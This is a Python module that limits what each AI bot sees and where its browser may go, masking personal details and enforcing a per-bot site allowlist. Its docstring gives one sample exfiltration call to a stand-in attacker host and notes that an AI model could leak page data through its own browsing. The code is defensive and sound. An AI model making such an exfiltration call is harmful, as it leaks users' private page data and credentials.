"""Per-bot limits on what a bot sees and where its browser may go.

Personal details: unless a bot may see them, emails, phone, card and bank
numbers on pages are masked in everything it reads (see pii.py).

Site list: a bot with "only these sites" turned on can open, click or be
redirected only to the sites you list plus the sites of the logins you
granted it (with their subdomains, so a sign-in hop such as
accounts.example.com still works). This closes the browser as a way to send
page data out, as in `open_url("https://attacker.example/?d=...")`. Pages'
own images, scripts and frames still load from anywhere public, since the bot
doesn't choose those. The bot's assistant may have other ways out (Grok can
browse on its own), so this narrows the risk rather than ending it.
"""

from __future__ import annotations

import asyncio
import time
from typing import TYPE_CHECKING, Any

from .mailcode import site_domains
from .origin import host_of

if TYPE_CHECKING:
    from .bots import Bots
    from .vault import Backend

LOGIN_HOSTS_TTL = 300


class PolicyMixin:
    bots: Bots | None
    backend: Backend
    audit: Any
    _login_sites: tuple[float, dict[str, set[str]]] = (0.0, {})

    def _bot_access(self, client: str) -> dict[str, Any] | None:
        _, _, bot = client.partition("/")
        if not bot or self.bots is None:
            return None
        try:
            return self.bots.access(bot)
        except Exception:
            return None

    def hides_personal(self, client: str) -> bool:
        acc = self._bot_access(client)
        return not (acc or {}).get("personal_details", False)

    async def _sites_of_logins(self) -> dict[str, set[str]]:
        at, sites = self._login_sites
        if time.monotonic() - at > LOGIN_HOSTS_TTL:
            logins = await asyncio.to_thread(self.backend.list_logins)
            sites = {l.title: site_domains([u for u in l.urls if host_of(u)]) for l in logins}
            self._login_sites = (time.monotonic(), sites)
        return sites

    async def site_allowed(self, client: str, host: str) -> bool:
        """May this bot's browser open `host` as a page? Always true unless its list is on."""
        acc = self._bot_access(client)
        if not acc or not acc.get("sites_limited"):
            return True
        host = host.lower().rstrip(".")
        allowed = set(acc.get("sites", []))
        try:
            by_title = await self._sites_of_logins()
        except Exception:
            by_title = {}
        for title in acc.get("logins", []):
            allowed |= by_title.get(title, set())
        if any(host == s or host.endswith("." + s) for s in allowed):
            return True
        self.audit.record("site_refused", client=client, host=host)
        return False
